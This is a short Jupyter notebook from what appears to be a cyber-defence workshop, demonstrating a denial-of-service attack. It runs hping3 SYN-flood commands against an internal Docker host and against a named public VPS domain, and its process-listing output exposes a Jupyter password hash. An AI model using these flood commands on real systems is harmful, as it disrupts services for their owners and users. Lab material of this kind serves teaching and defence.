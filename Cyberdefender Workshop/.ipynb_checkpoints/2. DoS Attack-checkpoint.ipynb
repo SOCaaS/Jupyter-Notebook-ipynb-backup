{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "demanding-ceramic",
   "metadata": {},
   "source": [
    "# DoS Attack\n",
    "Remmeber DoS Attack is an illegal without consent"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "conceptual-keyboard",
   "metadata": {},
   "source": [
    "## On Docker / Internal Network"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "id": "bronze-index",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Process is interrupted.\n"
     ]
    }
   ],
   "source": [
    "%%bash\n",
    "sudo hping3 -i u1 -S -p 80 agent"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "id": "becoming-swift",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\n",
      "jupyter        1  0.0  0.2 245768 65152 ?        Rsl  Mar28   0:19 /usr/local/bin/python3 /usr/local/bin/jupyter-notebook --no-browser --ip='0.0.0.0' --NotebookApp.password=argon2:$argon2id$v=19$m=10240,t=10,p=8$eUUKwVme8Br3m2pYymGwMg$sNLq99r8XMIJIHs2I7Sbrw\n",
      "jupyter      464  0.1  0.1 465784 48040 ?        Ssl  07:07   0:00 /usr/local/bin/python3 -m ipykernel_launcher -f /home/jupyter/.local/share/jupyter/runtime/kernel-ff37a5b2-7f8f-4bbc-a2b9-589385942891.json\n",
      "jupyter      484  0.0  0.0   4196  2820 ?        S    07:12   0:00 bash\n",
      "jupyter      485  0.0  0.0   7296  3016 ?        R    07:12   0:00 ps -aux\n"
     ]
    }
   ],
   "source": [
    "%%bash\n",
    "ps -aux"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "opposed-wednesday",
   "metadata": {},
   "source": [
    "## VPS on DigitalOcean"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "id": "usual-metropolitan",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Process is interrupted.\n"
     ]
    }
   ],
   "source": [
    "%%bash\n",
    "sudo hping3 -i u1 -S -p 80 doblog-uow.1ez.xyz"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "id": "fifty-replica",
   "metadata": {
    "scrolled": false
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\n",
      "jupyter        1  0.0  0.2 245768 65152 ?        Ssl  Mar28   0:20 /usr/local/bin/python3 /usr/local/bin/jupyter-notebook --no-browser --ip='0.0.0.0' --NotebookApp.password=argon2:$argon2id$v=19$m=10240,t=10,p=8$eUUKwVme8Br3m2pYymGwMg$sNLq99r8XMIJIHs2I7Sbrw\n",
      "jupyter      464  0.0  0.1 465784 48108 ?        Ssl  07:07   0:00 /usr/local/bin/python3 -m ipykernel_launcher -f /home/jupyter/.local/share/jupyter/runtime/kernel-ff37a5b2-7f8f-4bbc-a2b9-589385942891.json\n",
      "jupyter      494  0.0  0.0   4196  2960 ?        S    07:19   0:00 bash\n",
      "jupyter      495  0.0  0.0   7296  3000 ?        R    07:19   0:00 ps -aux\n"
     ]
    }
   ],
   "source": [
    "%%bash\n",
    "ps -aux"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.2"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
